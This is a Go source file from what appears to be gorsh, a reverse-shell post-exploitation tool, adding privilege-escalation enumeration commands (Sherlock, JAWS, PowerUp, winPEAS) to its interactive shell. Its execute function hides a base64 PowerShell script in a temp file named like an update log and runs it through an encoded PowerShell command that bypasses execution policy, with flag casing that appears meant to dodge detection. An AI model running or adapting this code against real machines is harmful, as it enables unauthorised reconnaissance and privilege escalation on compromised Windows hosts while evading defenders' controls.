package cmds

import (
	"fmt"
	"io/ioutil"
	"os"
	"os/exec"

	"github.com/abiosoft/ishell"
	"github.com/audibleblink/gorsh/internal/enum"
)

func addSubEnumCmds(sh *ishell.Cmd) *ishell.Cmd {
	sh.AddCmd(&ishell.Cmd{
		Name: "sherlock",
		Help: "github.com/rasta-mouse/linenum",
		Func: enumFn(enum.Sherlock),
	})

	sh.AddCmd(&ishell.Cmd{
		Name: "jaws",
		Help: "github.com/411hall/jaws",
		Func: enumFn(enum.Jaws),
	})

	sh.AddCmd(&ishell.Cmd{
		Name: "powerup",
		Help: "github.com/powershellmafia/powersploit",
		Func: enumFn(enum.PowerUp),
	})

	sh.AddCmd(&ishell.Cmd{
		Name: "winPEAS",
		Help: "github.com/carlospolop",
		Func: enumFn(enum.WinPeas),
	})
	return sh
}

func enumFn(fn func() *enum.EnumScript) func(*ishell.Context) {
	return func(c *ishell.Context) {
		b64, err := fn().UTF16LEB64()
		if err != nil {
			c.Println(err.Error())
		}
		executeWithProgress(b64, c)
	}
}

func execute(b64Script string) ([]byte, error) {
	tmpDir, err := ioutil.TempDir("", "logs")
	if err != nil {
		return []byte{}, err
	}
	defer os.Remove(tmpDir)

	tmpfile, err := ioutil.TempFile(tmpDir, "update*.log")
	if err != nil {
		return []byte{}, err
	}
	defer os.Remove(tmpfile.Name())

	if _, err := tmpfile.Write([]byte(b64Script)); err != nil {
		return []byte{}, err
	}
	if err := tmpfile.Close(); err != nil {
		return []byte{}, err
	}

	pshell := fmt.Sprintf("$f = Get-Content %s; ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($f)))| iEx", tmpfile.Name())
	pshell64, err := enum.ToUnicode(pshell)
	if err != nil {
		return []byte{}, err
	}

	args := []string{
		"-nOp",
		"-ep",
		"bYpasS",
		"-enc",
		pshell64,
	}

	return exec.Command("powershell", args...).Output()
}
